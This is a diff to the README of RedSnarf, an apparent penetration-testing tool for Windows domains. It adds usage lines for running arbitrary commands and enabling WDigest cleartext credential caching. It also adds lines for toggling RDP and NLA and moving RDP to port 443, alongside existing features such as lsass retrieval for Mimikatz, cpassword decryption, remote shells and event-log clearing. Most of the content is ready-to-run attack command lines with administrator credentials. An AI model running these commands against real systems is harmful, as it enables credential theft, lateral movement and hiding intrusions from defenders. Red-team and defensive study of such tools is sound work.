@@ -23,8 +23,11 @@ o	Credsfile will accept a mix of pwdump, fgdump and plain text username and pass
 •	Retrieval of Scripts and Policies folder from a Domain controller and parsing for 'password' and 'administrator';
 •	Ability to decrypt cpassword hashes;
 •	Ability to start a shell on a remote machine;
-•	The ability to clear the event logs (application, security, setup or system);
+•	The ability to clear the event logs (application, security, setup or system); (Internal Version only)
 •	Results are saved on a per-host basis for analysis.
+•	Enable/Disable RDP on a remote machine.
+•	Enable/Disable NLA on a remote machine.
+•	Find where users are logged in on remote machines.
 
 RedSnarf Usage
 =======================
@@ -100,6 +103,7 @@ Find User - Live
 Find User - Offline (searches pre downloaded information)
 /redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -f user.name
 
+
 Misc
 =======================
 
@@ -111,3 +115,59 @@ Start a Shell on a machine using domain administrator credentials
 
 Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
 ./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -l y
+
+Run Custom Command
+Example 1
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -x 'net user'
+
+Example 2 - Double Quotes need to be escaped with \
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -x 'dsquery group -name \"domain admins\" | dsget group -members -expand'
+
+Local Access Token Policy
+Creates a batch file lat.bat which you can copy and paste to the remote machine to execute which will modify the registry and either enable or disable Local Access Token Policy settings.
+./redsnarf.py -L y
+
+Wdigest
+Enable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W e
+
+Disable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W d
+
+Query UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W q
+
+
+
+RDP
+=======================
+
+RDP
+Enable RDP on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R e
+
+Disable RDP on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R d
+
+Query RDP status on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R q
+
+NLA
+Enable NLA on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r e
+
+Disable NLA on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r d
+
+Query NLA status on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r q
+
+Change RDP Port from 3389 to 443
+Change RDP Port to 443 on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t e
+
+Change RDP Port to default of 3389 on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t d
+
+Query RDP Port Value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t q
